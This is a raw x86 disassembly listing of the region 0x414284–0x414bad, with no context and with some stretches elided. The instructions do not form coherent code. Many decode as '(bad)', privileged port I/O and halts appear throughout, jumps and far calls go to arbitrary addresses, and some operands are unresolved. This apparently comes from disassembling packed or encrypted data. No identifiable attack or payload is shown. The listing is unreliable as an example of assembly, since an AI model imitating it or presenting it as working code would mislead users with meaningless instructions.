  414284:	aam    0x93
  414286:	out    dx,eax
  414287:	add    ecx,DWORD PTR [esp+edx*4-0x4e73f8df]
  41428e:	fild   WORD PTR [edi]
  414290:	mov    WORD PTR [esp+eax*4-0x2078bc05],ss
  414297:	add    ecx,DWORD PTR [esi+edx*2-0x6b56fc15]
  41429e:	out    0x3,eax
  4142a0:	mov    ecx,?
  4142a2:	out    0x4b,eax
  4142a4:	jg     0x41423a
  4142a6:	fild   WORD PTR [ebx]
	...
  4142bc:	dec    esi
  4142bd:	cdq    
  4142be:	(bad)  
  4142c0:	dec    ebx
  4142c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142c2:	fild   WORD PTR [ebx]
  4142c4:	rcr    DWORD PTR [edi+edx*4-0x208bc40e],0x45
  4142cc:	(bad)  
  4142cd:	xchg   esp,eax
  4142ce:	hlt    
  4142cf:	add    ebp,DWORD PTR [esp+edx*4-0x21]
  4142d3:	mov    BYTE PTR [ebx-0x73fc28d4],cl
  4142d9:	xchg   esp,eax
  4142da:	mov    eax,ds:0xdfb18c00
  4142df:	ret    
  4142e0:	or     esi,DWORD PTR [esp+ebx*1-0x4]
  4142e4:	cmp    ecx,DWORD PTR [edi+0x568c03df]
  4142ea:	jecxz  0x4142ef
  4142ec:	mov    cl,0x94
  4142ee:	pop    edi
  4142ef:	add    al,0x8c
  4142f1:	icebp  
  4142f2:	out    0x4b,eax
  4142f4:	xchg   DWORD PTR [edi+ebx*8-0x206731fd],edx
  4142fb:	(bad)  
  4142fc:	les    esi,FWORD PTR [ecx-0x6b72fc21]
  414302:	out    dx,al
  414303:	push   0xfc9321cc
  414308:	cdq    
  414309:	pop    ds
  41430a:	and    BYTE PTR [esi-0x71],al
  41430d:	xchg   esp,eax
  41430e:	bound  eax,QWORD PTR [ebp-0x16f76779]
  414314:	(bad)  
  414315:	jae    0x414392
  414317:	int3   
  414318:	sbb    dl,BYTE PTR [eax+ebx*1]
  41431b:	in     eax,dx
  41431c:	(bad)  
  41431d:	xchg   esp,eax
  41431e:	jg     0x414388
	...
  414334:	js     0x4142cd
  414336:	or     cl,ch
  414338:	dec    edi
  414339:	pop    edx
  41433a:	xchg   ebp,ebp
  41433c:	jnp    0x4143b1
  41433e:	cmc    
  41433f:	icebp  
  414340:	(bad)  
  414341:	xchg   esp,eax
  414342:	or     BYTE PTR [eax+0x11],dh
  414345:	mov    ds:0x178fe90c,eax
  41434a:	je     0x414311
  41434c:	pop    ebx
  41434d:	jae    0x4142d1
  41434f:	jo     0x4143b8
  414351:	xchg   edi,eax
  414352:	or     cl,ch
  414354:	sbb    ebx,DWORD PTR [esi+0x5489e882]
  41435a:	imul   BYTE PTR [ecx-0x12356b49]
  414360:	pop    DWORD PTR [edi+eiz*1-0x55]
  414364:	sub    esi,DWORD PTR [ebx-0x76]
  414367:	push   0xe908972b
  41436c:	xchg   al,ch
  41436e:	adc    esi,DWORD PTR [edx+0x8]
  414371:	mov    ds:0x1d8fe90c,eax
  414376:	xchg   ecx,esi
  414378:	add    esi,DWORD PTR [ebx-0xb]
  41437b:	sub    DWORD PTR [edi+0x14],ecx
  41437e:	adc    al,0xed
  414380:	(bad)  
  414381:	xchg   esp,eax
  414382:	add    cl,ch
  414384:	(bad)  
  414385:	xchg   esp,eax
  414386:	jg     0x4143f0
  414388:	fist   WORD PTR [esi+0x1c5ae908]
  41438e:	adc    ch,ch
  414390:	(bad)  
  414391:	xchg   esp,eax
  414392:	fmul   DWORD PTR [eax]
  414394:	push   ebx
  414395:	push   ss
  414396:	xchg   ebp,esi
	...
  4143ac:	ret    
  4143ad:	jb     0x4143a4
  4143af:	dec    esi
  4143b0:	sbb    al,0x90
  4143b2:	add    DWORD PTR [eax],0x96724
  4143b8:	mov    ch,0xef
  4143ba:	mov    BYTE PTR [eax],bl
  4143bc:	mov    cl,0x96
  4143be:	or     BYTE PTR [eax+0x72],al
  4143c1:	sbb    BYTE PTR [ecx],dl
  4143c3:	add    al,0xa5
  4143c5:	xchg   esi,eax
  4143c6:	add    BYTE PTR [eax],al
  4143c8:	jne    0x414360
  4143ca:	jg     0x41434d
  4143cc:	test   DWORD PTR [edx-0xb],esi
  4143cf:	(bad)  
  4143d0:	out    dx,al
  4143d1:	lock sbb eax,0x82966504
  4143d7:	add    DWORD PTR [edi-0x2a],esi
  4143da:	repz shr ch,0x98
  4143de:	leave  
  4143df:	mov    esi,DWORD PTR [ecx]
  4143e1:	push   edx
  4143e2:	or     DWORD PTR [ebx+0x55097491],ecx
  4143e8:	and    DWORD PTR [ebx],0x3a
  4143eb:	imul   BYTE PTR [eax+0x5d8af52d]
  4143f1:	sbb    dh,ch
  4143f3:	add    DWORD PTR [ecx+edx*4],edx
  4143f6:	dec    ebx
  4143f7:	lea    eax,[ecx+0x25]
  4143fa:	mov    bh,al
  4143fc:	xor    al,0x5
  4143fe:	in     eax,0x83
  414400:	fist   DWORD PTR [ebp-0x6415004d]
  414406:	test   BYTE PTR [ebp+0x72796da8],0xc6
  41440d:	out    dx,eax
  41440e:	test   BYTE PTR [ecx],0x0
	...
  414421:	add    BYTE PTR [eax],al
  414423:	add    BYTE PTR [esp+edi*2+0x9],cl
  414427:	add    ch,ah
  414429:	and    dl,BYTE PTR [eax]
  41442b:	mov    esi,DWORD PTR [eax+ebp*2+0x9]
  41442f:	add    ch,dh
  414431:	out    dx,al
  414432:	mov    BYTE PTR [eax],bl
  414434:	icebp  
  414435:	xchg   ebp,eax
  414436:	or     BYTE PTR [eax+0x5c],al
  414439:	fst    QWORD PTR [ecx]
  41443b:	add    al,0xb5
  41443d:	xchg   ebp,eax
  41443e:	jg     0x4143c1
  414440:	mov    WORD PTR [ebx-0xb],gs
  414443:	(bad)  
  414444:	mov    ebx,0x881789f6
  414449:	jnp    0x414454
  41444b:	test   dh,0x7c
  41444e:	test   DWORD PTR [ecx],ecx
  414450:	push   ss
  414451:	inc    esp
  414452:	or     ebx,ebx
  414454:	call   0x397d:0xa71774be
  41445b:	pop    ds
  41445c:	(bad)  
  41445d:	(bad)  
  41445e:	loopne 0x414463
  414460:	mov    WORD PTR [ebx-0x7a],?
  414463:	sbb    BYTE PTR [edi],al
  414465:	cld    
  414466:	cld    
  414467:	add    ecx,DWORD PTR [ebx+edi*2+0x77848072]
  41446e:	or     DWORD PTR [eax],eax
  414470:	int3   
  414471:	hlt    
  414472:	inc    ecx
  414473:	sbb    edx,DWORD PTR [eax+0xd89097b]
  414479:	imul   esi,ebp,0xffffffff
  41447c:	dec    ebx
  41447d:	out    0x8a,al
  41447f:	pop    ss
  414480:	mov    BYTE PTR [ebx+0x9],bh
  414483:	mov    dl,BYTE PTR [ebp+edi*2+0xfd24]
	...
  41449a:	add    BYTE PTR [eax],al
  41449c:	dec    edi
  41449d:	or     al,0x13
  41449f:	cmp    BYTE PTR [edx],0x7c
  4144a2:	jno    0x4144bb
  4144a4:	cdq    
  4144a5:	int    0xa4
  4144a7:	add    ch,ah
  4144a9:	pop    esi
  4144aa:	cmc    
  4144ab:	call   DWORD PTR [ebx]
  4144ad:	nop
  4144ae:	loope  0x41443a
  4144b0:	or     eax,0x3fff56b
  4144b5:	hlt    
  4144b6:	mov    dl,BYTE PTR [edi]
  4144b8:	nop
  4144b9:	jnp    0x4144c4
  4144bb:	inc    eax
  4144bc:	add    eax,0x8c03edd4
  4144c1:	jnp    0x414535
  4144c3:	cmp    BYTE PTR [edi+edi*2+0x9],0x0
  4144c8:	pop    es
  4144c9:	cld    
  4144ca:	loope  0x4144cf
  4144cc:	mov    WORD PTR [edi+ebx*8-0x246d32ef],ss
  4144d3:	std    
  4144d4:	adc    eax,0xb935e184
  4144d9:	push   ebp
  4144da:	repz cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  4144dd:	xchg   ebp,eax
  4144de:	pavgw  mm1,QWORD PTR [ebx+edi*1+0x70a3ffd3]
  4144e6:	mov    ah,0xea
  4144e8:	push   es
  4144e9:	adc    ecx,edi
  4144eb:	call   DWORD PTR [ebx-0x5c7d8790]
  4144f1:	cwde   
  4144f2:	fild   WORD PTR [ebx]
  4144f4:	int3   
  4144f5:	sbb    eax,0x948fe758
  4144fa:	fistp  QWORD PTR [edx+0xc]
  4144fd:	test   ebx,esp
  4144ff:	add    eax,DWORD PTR [eax]
	...
  414511:	add    BYTE PTR [eax],al
  414513:	add    BYTE PTR [ebx+ebx*1-0x6b701488],cl
  41451a:	fbstp  TBYTE PTR [ebx]
  41451c:	lods   al,BYTE PTR ds:[esi]
  41451d:	iret   
  41451e:	test   DWORD PTR [esi-0x4d2066b3],esp
  414524:	loopne 0x414541
  414526:	inc    ebx
  414527:	loopne 0x4144bc
  414529:	(bad)  
  41452a:	adc    al,BYTE PTR [edx+eiz*8+0x13]
  41452e:	(bad)  
  41452f:	idiv   DWORD PTR [ecx+0x2bf78c99]
  414535:	jo     0x414516
  414537:	jp     0x4144e0
  414539:	mov    eax,0xbc227ad3
  41453e:	mov    esp,0xdfb8af79
  414543:	jns    0x4144ef
  414545:	sbb    dl,cl
  414547:	nop
  414548:	mov    ds:0xe17bac1b,eax
  41454d:	and    DWORD PTR [edx+0x4],edi
  414550:	mov    WORD PTR [edi+ebx*8-0x12177a37],ss
  414557:	mov    esp,0xa008194d
  41455c:	std    
  41455d:	imul   ecx,DWORD PTR [ecx-0x40e72c57],0xc812c7dc
  414567:	jmp    0x41450f
  414569:	xchg   edx,eax
  41456a:	mov    DWORD PTR [ecx],ebp
  41456c:	mov    ebx,0x146a4ed6
  414571:	mov    ah,0x14
  414573:	call   0x9f96a774
	...
  41458c:	hlt    
  41458d:	retf   0xe5ca
  414590:	(bad)  
  414591:	sbb    ebx,DWORD PTR [ebp+eax*1-0x74]
  414595:	leave  
  414596:	pop    esi
  414597:	jb     0x41453a
  414599:	push   esi
  41459a:	mov    ss,ecx
  41459c:	sub    DWORD PTR [edi-0xb],0xffffffe9
  4145a0:	(bad)  
  4145a1:	xchg   esp,eax
  4145a2:	or     BYTE PTR [ebx+0x76],ah
  4145a5:	adc    edi,DWORD PTR [edi+0x7bfebf6]
  4145ab:	jmp    0x75c30d3f
  4145b0:	cmp    eax,DWORD PTR [ebx-0x16a51177]
  4145b6:	or     esp,DWORD PTR [esi-0x160a90be]
  4145bc:	(bad)  
  4145bd:	push   ebp
  4145be:	and    DWORD PTR [esi+0x5500adbf],ebp
  4145c4:	neg    ch
  4145c6:	dec    eax
  4145c7:	ins    BYTE PTR es:[edi],dx
  4145c8:	xchg   edx,eax
  4145c9:	call   0x8be2b0cc
  4145ce:	or     al,0xe9
  4145d0:	(bad)  
  4145d1:	outs   dx,DWORD PTR ds:[esi]
  4145d2:	jnp    0x4145a0
  4145d4:	xchg   esi,eax
  4145d5:	sbb    DWORD PTR [eax],ebx
  4145d7:	in     eax,dx
  4145d8:	(bad)  
  4145d9:	xchg   esp,eax
  4145da:	jg     0x414643
  4145dc:	not    DWORD PTR [edx+0x55cfe908]
  4145e2:	mov    gs,ebp
  4145e4:	rep outs dx,BYTE PTR ds:[esi]
  4145e6:	cmc    
  4145e7:	add    ch,bl
  4145e9:	xchg   edx,eax
  4145ea:	or     BYTE PTR [eax],al
  4145ec:	pop    esp
  4145ed:	icebp  
  4145ee:	add    eax,0x4
	...
  414603:	add    ch,ah
  414605:	xchg   edx,eax
  414606:	add    DWORD PTR [esi-0xa9143],0x86827385
  414610:	lds    ebp,FWORD PTR [esi-0xb]
  414613:	jmp    FWORD PTR [edi]
  414615:	ins    DWORD PTR es:[edi],dx
  414616:	push   esi
  414617:	mov    BYTE PTR [ebp-0x46ef746b],ch
  41461d:	xchg   edx,eax
  41461e:	or     BYTE PTR [esi+0x0],bl
  414621:	aad    0xd
  414623:	add    BYTE PTR [eax],ch
  414625:	xchg   esi,eax
  414626:	jns    0x4145e0
  414628:	es mov al,0xf6
  41462b:	add    DWORD PTR [ebx],eax
  41462d:	jbe    0x414638
  41462f:	add    BYTE PTR [ebp-0x13],dh
  414632:	pusha  
  414633:	or     DWORD PTR [eax],ebx
  414635:	add    DWORD PTR [edx-0xa918a7a],0x1defdcff
  41463f:	add    al,0x75
  414641:	xchg   edx,eax
  414642:	dec    eax
  414643:	mov    ebx,edx
  414645:	jne    0x414650
  414647:	add    BYTE PTR [ebp-0xf],ah
  41464a:	mov    edx,DWORD PTR [eax]
  41464c:	cmp    DWORD PTR [edx-0x7f5474f8],edx
  414652:	or     DWORD PTR [eax],eax
  414654:	and    eax,0xf70205ec
  414659:	xchg   esi,eax
  41465a:	(bad)  
  41465b:	mov    BYTE PTR [ebp-0x6d],al
  41465e:	xchg   BYTE PTR [ecx+ebp*1],bl
  414661:	xchg   edx,eax
  414662:	or     BYTE PTR [ebp+0x3c],dh
  414665:	in     eax,dx
  414666:	mov    edx,DWORD PTR [eax]
	...
  41467c:	sub    DWORD PTR [edx-0x7f8476f8],edx
  414682:	or     DWORD PTR [eax],eax
  414684:	cmc    
  414685:	push   ecx
  414686:	sub    BYTE PTR [esi-0xa9874],0xf3
  41468d:	hlt    
  41468e:	jbe    0x41469f
  414690:	nop
  414691:	jnp    0x41469c
  414693:	mov    ecx,DWORD PTR [edx]
  414695:	je     0x41468c
  414697:	(bad)  
  414698:	fcomi  st,st(1)
  41469a:	cld    
  41469b:	add    DWORD PTR [esi-0x6378b503],edi
  4146a1:	jl     0x41471e
  4146a3:	sbb    ecx,DWORD PTR [eax-0x6a8af685]
  4146a9:	bnd jbe 0x4146bb
  4146ac:	mov    BYTE PTR [ebx+0x9],bh
  4146af:	mov    DWORD PTR [edx],edx
  4146b1:	je     0x4146a8
  4146b3:	jmp    DWORD PTR [ebx+0x78ad723b]
  4146b9:	jg     0x4146c4
  4146bb:	add    BYTE PTR ds:0x8c03fcf6,al
  4146c1:	jnp    0x414733
  4146c3:	test   DWORD PTR [edi+esi*2+0x73060009],esp
  4146ca:	pop    es
  4146cb:	leave  
  4146cc:	jb     0x41468a
  4146ce:	outs   dx,DWORD PTR ds:[esi]
  4146cf:	(bad)  
  4146d0:	scas   eax,DWORD PTR es:[edi]
  4146d1:	nop
  4146d2:	je     0x4146db
  4146d4:	mov    esi,0x35e73ee2
  4146d9:	addr16 or al,0xfe
  4146dc:	pop    es
  4146dd:	mov    dh,0x87
  4146df:	fild   WORD PTR [eax]
	...
  4146f1:	add    BYTE PTR [eax],al
  4146f3:	add    BYTE PTR [eax+0x34cd6fab],dl
  4146f9:	aas    
  4146fa:	or     eax,0x3cf23bfe
  4146ff:	sub    BYTE PTR ds:0x5a8aba79,0x43
  414706:	dec    esp
  414707:	sti    
  414708:	and    ebp,DWORD PTR [esi]
  41470a:	mov    dh,ah
  41470c:	lea    ecx,[esi-0x18db3291]
  414712:	or     eax,0x4e940bfe
  414717:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414718:	pusha  
  414719:	push   edx
  41471a:	test   DWORD PTR [ebx],0x29e5b0f
  414720:	add    dl,BYTE PTR [eax+0x1f8c03eb]
  414726:	sbb    bl,bh
  414728:	pop    eax
  414729:	mov    edi,DWORD PTR [edx+0x7d]
  41472c:	mov    ebx,DWORD PTR [eax+0x160503df]
  414732:	xlat   BYTE PTR ds:[ebx]
  414733:	dec    ebx
  414735:	ins    BYTE PTR es:[edi],dx
  414736:	lahf   
  414737:	jp     0x41472a
  414739:	(bad)  
  41473a:	jmp    0x41473f
  41473c:	mov    WORD PTR [ebx],ds
  41473e:	gs repz (bad) 
  414741:	xchg   esp,eax
  414742:	fistp  QWORD PTR [eax+0x11]
  414745:	mov    ebx,fs
  414747:	add    ecx,DWORD PTR [edx+ebx*1+0x6dbe01cf]
  41474e:	and    DWORD PTR [ebx-0x7d],edi
  414751:	xchg   ebx,eax
  414752:	push   ebp
  414753:	out    0x8f,eax
  414755:	xchg   esp,eax
  414756:	fisttp WORD PTR [esi+0x0]
	...
  41476c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41476d:	pop    ds
  41476e:	ins    DWORD PTR es:[edi],dx
  41476f:	repz (bad) 
  414771:	xchg   esp,eax
  414772:	fistp  QWORD PTR [edx+0x9]
  414775:	(bad)  
  414776:	jmp    0x41477b
  414778:	mov    esp,ss
  41477a:	js     0x4147d1
  41477c:	xchg   DWORD PTR [eax+0x130503df],edx
  414782:	iret   
  414783:	call   DWORD PTR [ebx+0x6c]
  414786:	push   0x7d
  414788:	mov    ds:0x1603df90,eax
  41478d:	test   ecx,esp
  41478f:	aad    0x3a
  414791:	push   edi
  414792:	addr16 adc al,0x33
  414795:	sbb    ah,bl
  414797:	pop    es
  414798:	mov    WORD PTR [esp+esi*1-0x30eceae3],ss
  41479f:	pop    es
  4147a0:	mov    WORD PTR [eax+ecx*1+0xc8d0660],ss
  4147a7:	jmp    0x57c11c3b
  4147ac:	lods   al,BYTE PTR ds:[esi]
  4147ad:	nop
  4147ae:	or     cl,ch
  4147b0:	or     BYTE PTR [ebx],dl
  4147b2:	sbb    ch,ch
  4147b4:	(bad)  
  4147b5:	xchg   esp,eax
  4147b6:	and    DWORD PTR [edi-0x78],0x11e90890
  4147bd:	test   DWORD PTR [edx],ecx
  4147bf:	fwait
  4147c0:	mov    ss,WORD PTR [edi-0x80]
  4147c3:	(bad)  [eax-0x701aebe6]
  4147c9:	xchg   esp,eax
  4147ca:	jnp    0x4147cc
  4147cc:	adc    edx,DWORD PTR [ebx]
  4147ce:	sbb    ch,ah
	...
  4147e4:	(bad)  
  4147e5:	xchg   esp,eax
  4147e6:	jg     0x414857
  4147e8:	nop
  4147e9:	nop
  4147ea:	or     cl,ch
  4147ec:	dec    edi
  4147ed:	adc    esp,DWORD PTR [esi+0x8948be5]
  4147f3:	jo     0x4147fb
  4147f5:	test   DWORD PTR [ecx+ebp*8],ecx
  4147f8:	(bad)  
  4147f9:	sbb    eax,0x9493d18e
  4147fe:	or     BYTE PTR [ecx],bh
  414800:	test   al,0x6b
  414802:	cmp    ebp,0xffffff93
  414805:	xchg   esp,eax
  414806:	or     BYTE PTR [eax+edx*4-0x6c0671e3],bl
  41480d:	xchg   esp,eax
  41480e:	or     BYTE PTR [eax+0x16],dh
  414811:	mov    WORD PTR [ecx+ebp*8],cs
  414814:	(bad)  
  414815:	aam    0x7f
  414817:	inc    edi
  414818:	lods   al,BYTE PTR ds:[esi]
  414819:	nop
  41481a:	or     cl,ch
  41481c:	sbb    BYTE PTR [edx],dl
  41481e:	sbb    ch,ch
  414820:	(bad)  
  414821:	xchg   esp,eax
  414822:	and    DWORD PTR [edi-0x69],0x5fe90890
  414829:	mov    ah,0x7
  41482b:	pop    edi
  41482c:	mov    edx,DWORD PTR [eax-0x13cafff8]
  414832:	sbb    eax,0xc87b38b
  414837:	add    BYTE PTR ds:0xf1188e18,ah
  41483d:	xchg   esi,eax
  41483e:	or     BYTE PTR [eax+0x7c],al
  414841:	and    eax,0x96e50414
  414846:	lea    eax,[esi+0x0]
	...
  41485c:	cmc    
  41485d:	xchg   edx,eax
  41485e:	or     BYTE PTR [eax],al
  414860:	outs   dx,BYTE PTR ds:[esi]
  414861:	sbb    eax,0x96f50410
  414866:	fsub   DWORD PTR [eax]
  414868:	in     al,0x4
  41486a:	adc    al,0x4
  41486c:	in     eax,0x96
  41486e:	jns    0x414889
  414870:	cs sbb eax,0x96b50418
  414876:	lea    eax,[esi+0x89c8d]
  41487c:	in     eax,0x17
  41487e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41487f:	sbb    al,0xb1
  414881:	xchg   esi,eax
  414882:	or     BYTE PTR [ecx+0xc8733],cl
  414888:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414889:	sbb    DWORD PTR [esi+0x896a118],edi
  41488f:	rcl    BYTE PTR [ebx+0x7dc251f6],1
  414895:	xchg   esi,eax
  414896:	jg     0x4148dc
  414898:	push   ecx
  414899:	xchg   edx,eax
  41489a:	pop    esi
  41489b:	push   edi
  41489c:	out    dx,al
  41489d:	jmp    0x612f58ce
  4148a2:	xor    DWORD PTR [eax+0x73089675],eax
  4148a8:	cmp    DWORD PTR [ebx],edx
  4148aa:	repz add al,0xd6
  4148ad:	mov    gs,WORD PTR [edi]
  4148af:	xchg   BYTE PTR [ecx-0x6e],dl
  4148b2:	or     BYTE PTR [eax],al
  4148b4:	loope  0x414882
  4148b6:	sti    
  4148b7:	fmul   DWORD PTR [esi-0x731f78b0]
  4148bd:	jns    0x414927
  4148bf:	add    DWORD PTR [eax],0x0
	...
  4148d1:	add    BYTE PTR [eax],al
  4148d3:	add    BYTE PTR [ecx+esi*2+0x67],cl
  4148d7:	ret    0x7b94
  4148da:	xor    al,0x86
  4148dc:	jo     0x41494d
  4148de:	or     DWORD PTR [eax],eax
  4148e0:	cwde   
  4148e1:	pusha  
  4148e2:	or     BYTE PTR ss:[ebx+edi*2-0x1768ef7],0xf7
  4148eb:	add    ah,bh
  4148ed:	imul   esi,DWORD PTR [esi],0x0
  4148f0:	mov    DWORD PTR [ebx+0x9],edi
  4148f3:	jb     0x414882
  4148f5:	mov    dh,BYTE PTR ds:0x97b6100
  4148fb:	jb     0x41488a
  4148fd:	mov    edx,0x8e84e8c9
  414902:	mov    eax,eax
  414904:	(bad)  
  414905:	mov    esp,esp
  414907:	es (bad) 
  414909:	repnz pop es
  41490b:	push   esi
  41490c:	pop    es
  41490d:	mov    edx,0x5fa4d883
  414912:	repz std 
  414914:	stos   DWORD PTR es:[edi],eax
  414915:	enter  0x1840,0x96
  414919:	ss push 0x963ce5e
  41491f:	push   ebp
  414920:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414921:	outs   dx,DWORD PTR ds:[esi]
  414922:	repz std 
  414924:	mov    ebx,DWORD PTR [edx]
  414926:	mov    eax,es
  414928:	mov    BYTE PTR [ecx-0x35],dl
  41492b:	or     BYTE PTR [esi+ebp*1+0x73a85c84],cl
  414932:	pop    esi
  414933:	push   esi
  414934:	pop    ss
  414935:	mov    WORD PTR [ebx+0xbe],cs
	...
  41494b:	add    BYTE PTR [edi+esi*2+0x28c0009],dh
  414952:	sbb    BYTE PTR [edi+esi*2+0xd00097c],al
  414959:	mov    WORD PTR [eax],ax
  41495c:	mov    WORD PTR [edi+ebx*8+0x53157b74],ss
  414963:	sub    BYTE PTR [eax+edx*4-0x5ecbc1ae],dl
  41496a:	fiadd  DWORD PTR [eax]
  41496c:	and    bl,BYTE PTR ds:0x6d5cebbd
  414972:	mov    dh,0x0
  414974:	push   es
  414975:	pop    edx
  414976:	(bad)  
  414977:	std    
  414978:	push   es
  414979:	imul   esp,DWORD PTR [esi+0x7b0488d],0xeb84228d
  414983:	add    ecx,DWORD PTR [esi+ebx*1-0x6d14d856]
  41498a:	test   al,0x5
  41498c:	and    ecx,ecx
  41498e:	ja     0x414995
  414990:	fst    DWORD PTR [ecx]
  414992:	iret   
  414993:	pop    es
  414994:	mov    WORD PTR [eax+ebp*2-0x206f8f5f],ss
  41499b:	add    esp,DWORD PTR [edx-0x39]
  41499e:	retf   0x84c5
  4149a1:	xchg   esp,eax
  4149a2:	(bad)  
  4149a3:	shl    BYTE PTR [ecx-0x6fe0626e],1
  4149a9:	xchg   esp,eax
  4149aa:	fisttp WORD PTR [esi+0x1ab49b31]
	...
  4149c4:	add    eax,0x8c07cf12
  4149c9:	xchg   esp,eax
  4149ca:	push   0xdf90a489
  4149cf:	add    ecx,esp
  4149d1:	sbb    eax,0x94901f5d
  4149d6:	fisttp WORD PTR [edx+0x3e3850a]
  4149dc:	mov    WORD PTR [ebx],ds
  4149de:	ins    DWORD PTR es:[edi],dx
  4149df:	sbb    ecx,DWORD PTR [eax-0x7b72206c]
  4149e5:	xchg   edx,eax
  4149e6:	cmp    BYTE PTR [ecx],al
  4149e8:	dec    esp
  4149e9:	sbb    eax,0x268ee108
  4149ee:	adc    al,0xe5
  4149f0:	(bad)  
  4149f1:	xchg   esp,eax
  4149f2:	jnp    0x4149f4
  4149f4:	pop    es
  4149f5:	(bad)  
  4149f7:	in     eax,0x8f
  4149f9:	xchg   esp,eax
  4149fa:	jg     0x414a6b
  4149fc:	mov    BYTE PTR [eax+0xfcfe908],dl
  414a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a03:	in     eax,0x93
  414a05:	xchg   esp,eax
  414a06:	or     BYTE PTR [eax+0xa],dh
  414a09:	test   DWORD PTR [ecx+ebp*8],ecx
  414a0c:	(bad)  
  414a0d:	sbb    eax,0x948bd18e
  414a12:	or     BYTE PTR [ecx-0x5726e250],bh
  414a18:	out    0x9c,al
  414a1a:	mov    DWORD PTR [ebx-0x607e3d72],ebp
  414a20:	lock dec edi
  414a22:	repnz xchg bl,bl
  414a25:	sbb    eax,0xd98e
	...
  414a3a:	add    BYTE PTR [eax],al
  414a3c:	mov    edx,DWORD PTR [eax+ecx*1+0x72ca861]
  414a43:	jmp    0x6f48ded7
  414a48:	mov    al,ds:0xe90890
  414a4d:	pop    es
  414a4e:	sub    al,0xed
  414a50:	(bad)  
  414a51:	xchg   esp,eax
  414a52:	xchg   DWORD PTR [edx+0x8],edx
  414a55:	xchg   ebp,eax
  414a56:	or     cl,ch
  414a58:	push   ds
  414a59:	mov    WORD PTR [ecx+0xa8c6bcd],cs
  414a5f:	(bad)  
  414a60:	fdiv   QWORD PTR [eax+0x56169810]
  414a66:	loopne 0x414ae6
  414a68:	jbe    0x414ad3
  414a6a:	cmc    
  414a6b:	mov    esi,0x2b51cbd1
  414a70:	cwde   
  414a71:	xchg   esp,eax
  414a72:	xchg   DWORD PTR [edx],edx
  414a74:	mov    BYTE PTR [ebx-0x1a9afff8],dl
  414a7a:	or     al,0x29
  414a7c:	sub    DWORD PTR [edi-0x6cc17ef0],ebp
  414a82:	jno    0x414a84
  414a84:	xor    eax,0x69290ce5
  414a89:	mov    esp,0xbc618b10
  414a8e:	adc    BYTE PTR [ecx-0x52],dl
  414a91:	pop    ecx
  414a92:	loopne 0x414b00
  414a94:	aas    
  414a95:	repz pop di
  414a98:	jae    0x414a8f
  414a9a:	dec    edi
  414a9b:	ret    0x931d
  414a9e:	retf   
  414a9f:	xchg   BYTE PTR [eax],al
	...
  414ab1:	add    BYTE PTR [eax],al
  414ab3:	add    BYTE PTR [ebp-0xbfff764],cl
  414ab9:	xchg   edx,eax
  414aba:	or     BYTE PTR [eax],al
  414abc:	fs push 0xffffff88
  414abf:	add    ch,ah
  414ac1:	xchg   edx,eax
  414ac2:	ja     0x414b0d
  414ac4:	jbe    0x414aad
  414ac6:	sub    al,0x18
  414ac8:	jmp    0x737c95ae
  414acd:	scas   eax,DWORD PTR es:[edi]
  414ace:	or     al,0x0
  414ad0:	in     eax,0xde
  414ad2:	xor    ch,al
  414ad4:	scas   eax,DWORD PTR es:[edi]
  414ad5:	ins    BYTE PTR es:[edi],dx
  414ad6:	repz jmp FWORD PTR [esi]
  414ad9:	pop    ecx
  414ada:	loopne 0x414adf
  414adc:	das    
  414add:	repz mov sp,WORD PTR [ebx+0x7b]
  414ae2:	sar    ecx,0x42
  414ae5:	data16 add BYTE PTR [ecx+ecx*4-0x78],0x7f
  414aeb:	mov    ?,WORD PTR [ebp+0x1f00088e]
  414af1:	inc    edx
  414af2:	sub    al,0x1
  414af4:	ja     0x414b3a
  414af6:	or     al,dl
  414af8:	adc    bl,BYTE PTR [edx]
  414afa:	cmc    
  414afb:	(bad)  
  414afc:	jmp    0x414a7f
  414afe:	or     al,0x0
  414b00:	sbb    DWORD PTR gs:[esi+0x9778c24],edx
  414b07:	add    dl,al
  414b09:	cmp    BYTE PTR [edx-0x3e],dl
  414b0c:	test   BYTE PTR [ebx-0x76],bh
  414b0f:	int    0x53
  414b11:	jge    0x414ac6
  414b13:	sbb    al,0x90
  414b15:	jnp    0x414b20
  414b17:	mov    eax,DWORD PTR [eax]
	...
  414b29:	add    BYTE PTR [eax],al
  414b2b:	add    BYTE PTR [ebx+0x7177074],dh
  414b31:	neg    BYTE PTR [esp+eax*1]
  414b34:	mov    WORD PTR [ebx-0x7e],?
  414b37:	xchg   BYTE PTR [edi+esi*2-0xb33fff7],al
  414b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b3f:	sbb    al,0x90
  414b41:	jnp    0x414b4c
  414b43:	xchg   DWORD PTR [edx],ecx
  414b45:	dec    esp
  414b46:	or     eax,0x8ef28c00
  414b4b:	sbb    BYTE PTR [eax-0x6375f685],cl
  414b51:	jns    0x414b2a
  414b53:	dec    dh
  414b55:	jecxz  0x414b73
  414b57:	jmp    FWORD PTR [ecx]
  414b59:	pusha  
  414b5a:	or     eax,0x11808c00
  414b5f:	mov    DWORD PTR [edx],edx
  414b61:	dec    esp
  414b62:	or     eax,0x8ee48c00
  414b67:	sbb    BYTE PTR [eax+0x1540097b],dl
  414b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b6e:	sub    BYTE PTR [esp+ecx*4],al
  414b71:	jnp    0x414af5
  414b73:	xchg   BYTE PTR [edi+ebp*2-0x9e8fff7],bl
  414b7a:	adc    al,0x4
  414b7c:	mov    WORD PTR [ebx-0x27],?
  414b7f:	and    BYTE PTR [edi-0x13],dl
  414b82:	and    BYTE PTR [esp+ecx*4],al
  414b85:	jnp    0x414c04
  414b87:	jb     0x414ba0
  414b89:	mov    edx,0xfa94e8c9
  414b8e:	int3   
  414b8f:	add    DWORD PTR [eax],eax
	...
  414ba1:	add    BYTE PTR [eax],al
  414ba3:	add    ah,bl
  414ba5:	xchg   esp,eax
  414ba6:	pop    ss
  414ba7:	xchg   esi,eax
  414ba8:	jnp    0x414c0f
  414baa:	push   ss
  414bab:	mov    DWORD PTR [edx],ebx
  414bad:	test   bl,ah
